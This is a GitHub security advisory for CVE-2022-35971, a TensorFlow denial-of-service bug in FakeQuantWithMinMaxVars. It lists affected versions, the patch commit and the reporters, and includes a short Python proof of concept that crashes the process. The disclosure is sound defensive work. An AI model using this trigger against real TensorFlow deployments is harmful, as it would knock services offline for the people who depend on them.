# [M]  TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVars`

## Summary
Severity: Medium
Advisory: GHSA-9fpg-838v-wpv7
CVE: CVE-2022-35971
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-9fpg-838v-wpv7
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1

## Details
### Impact
If `FakeQuantWithMinMaxVars` is given `min` or `max` tensors of a nonzero rank, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

num_bits = 8
narrow_range = False
inputs = tf.constant(0, shape=[2,3], dtype=tf.float32)
min = tf.constant(0, shape=[2,3], dtype=tf.float32)
max = tf.constant(0, shape=[2,3], dtype=tf.float32)
tf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
 - Neophytos Christou, Secure Systems Labs, Brown University.
 - 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9fpg-838v-wpv7
- https://nvd.nist.gov/vuln/detail/CVE-2022-35971
- https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
